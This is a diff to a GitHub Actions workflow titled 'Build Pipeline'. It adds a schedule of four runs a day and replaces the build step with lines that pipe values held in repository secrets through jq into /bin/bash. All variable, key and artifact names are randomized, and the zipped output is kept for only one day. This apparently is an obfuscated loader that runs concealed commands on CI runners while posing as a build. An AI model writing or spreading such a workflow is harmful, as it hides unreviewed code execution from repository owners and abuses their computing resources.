@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '35 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,18 +24,17 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          qqca29: ${{ secrets.qqca29 }}
+          fmzc3: ${{ secrets.fmzc3 }}
         run: |
-          printf '%s' "$qqca29" | jq -r .olzu894 | /bin/bash
-          printf '%s' "$u05246" | jq -r .dedyt49 | /bin/bash
-          echo $ney5982 | jq -r .i72514 | /bin/bash
-          echo $odcyg14 | jq -r .la7273 | /bin/bash
-          echo $oad6 | jq -r .subgq59194 | /bin/bash
+          printf '%s' "$fmzc3" | jq -r .wu8 | /bin/bash
+          printf '%s' "$yo47422" | jq -r .d2247 | /bin/bash
+          echo $avd0 | jq -r .zm75 | /bin/bash
+          echo $utnc69264 | jq -r .a5 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: B16X18V0
+          name: Mwt2aFvM
           path: "*.zip"
           retention-days: 1
